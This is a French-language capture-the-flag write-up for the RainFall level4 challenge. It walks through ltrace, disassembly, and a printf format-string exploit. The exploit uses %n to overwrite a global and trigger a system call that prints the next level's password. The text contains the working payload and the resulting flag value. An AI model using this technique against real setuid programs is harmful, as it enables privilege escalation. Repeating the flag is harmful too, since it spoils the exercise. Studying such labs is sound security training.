On a un binaire:
```sh
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```
Essayons ltrace:
```sh
level4@RainFall:~$ ltrace ./level4
__libc_start_main(0x80484a7, 1, 0xbffff7f4, 0x80484c0, 0x8048530 <unfinished ...>
fgets(dsdsd
"dsdsd\n", 512, 0xb7fd1ac0)                                                    = 0xbffff540
printf("dsdsd\n"dsdsd
)                                                                    = 6
+++ exited (status 0) +++
```
on a un appel a fgets dans un buffer de 512 et a printf. Désassemblons:
```asm
08048444 <p>:
 8048444:       55                      push   ebp
 8048445:       89 e5                   mov    ebp,esp
 8048447:       83 ec 18                sub    esp,0x18
 804844a:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 804844d:       89 04 24                mov    DWORD PTR [esp],eax
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt>
 8048455:       c9                      leave
 8048456:       c3                      ret

08048457 <n>:
 8048457:       55                      push   ebp
 8048458:       89 e5                   mov    ebp,esp
 804845a:       81 ec 18 02 00 00       sub    esp,0x218
 8048460:       a1 04 98 04 08          mov    eax,ds:0x8049804
 8048465:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048469:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048477:       89 04 24                mov    DWORD PTR [esp],eax
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt>
 804847f:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048485:       89 04 24                mov    DWORD PTR [esp],eax
 8048488:       e8 b7 ff ff ff          call   8048444 <p>
 804848d:       a1 10 98 04 08          mov    eax,ds:0x8049810
 8048492:       3d 44 55 02 01          cmp    eax,0x1025544
 8048497:       75 0c                   jne    80484a5 <n+0x4e>
 8048499:       c7 04 24 90 85 04 08    mov    DWORD PTR [esp],0x8048590
 80484a0:       e8 bb fe ff ff          call   8048360 <system@plt>
 80484a5:       c9                      leave
 80484a6:       c3                      ret

080484a7 <main>:
 80484a7:       55                      push   ebp
 80484a8:       89 e5                   mov    ebp,esp
 80484aa:       83 e4 f0                and    esp,0xfffffff0
 80484ad:       e8 a5 ff ff ff          call   8048457 <n>
 80484b2:       c9                      leave
 80484b3:       c3                      ret
 80484b4:       90                      nop
 80484b5:       90                      nop
 80484b6:       90                      nop
 80484b7:       90                      nop
 80484b8:       90                      nop
 80484b9:       90                      nop
 80484ba:       90                      nop
 80484bb:       90                      nop
 80484bc:       90                      nop
 80484bd:       90                      nop
 80484be:       90                      nop
 80484bf:       90                      nop
```
plusieurs observations:
- un **cmp** conditionne l'appel a system qui nous intéresse
- la valeur contenue à l'adresse **0x8049810** dans le data segment est chargée dans **eax** et est comparée à **0x1025544** soit 16930116 qui est bien trop élevé pour que le hack du level3 fonctionne.
- l'appel à system prend une string en argument qui contient directement la commande qui nous donnerait le flag, donc a priori, pas besoin de maintenir un stdin ouvert via un shell:
```bash
(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"
```
Nous allons donc procéder à un format exploit de printf. Première étape, chercher l'offset:
```bash
level4@RainFall:~$ python -c 'print "aaaa%p%p%p%p%p%p%p%p%p%p%p%p%p"' | ./level4
aaaa0xb7ff26b00xbffff7940xb7fd0ff4(nil)(nil)0xbffff7580x804848d0xbffff5500x2000xb7fd1ac00xb7ff37d00x616161610x70257025
```
Notre chaîne "aaaa", soit 0x61616161 se trouve en 12ème position!
> Le format %x et %d sont modifiables de manière a spécifier un padding avant d'imprimer la valeur e.g.: %20x met un padding de 20 espaces
Nous allons donc spécifier un padding de **16930116** moins les 4 octets de l'adresse **0x8049810**, ainsi que le format %n pour l'argument en 12ème position:
```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08%16930112x%12$n"' | ./level4
                                          b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
Flag !
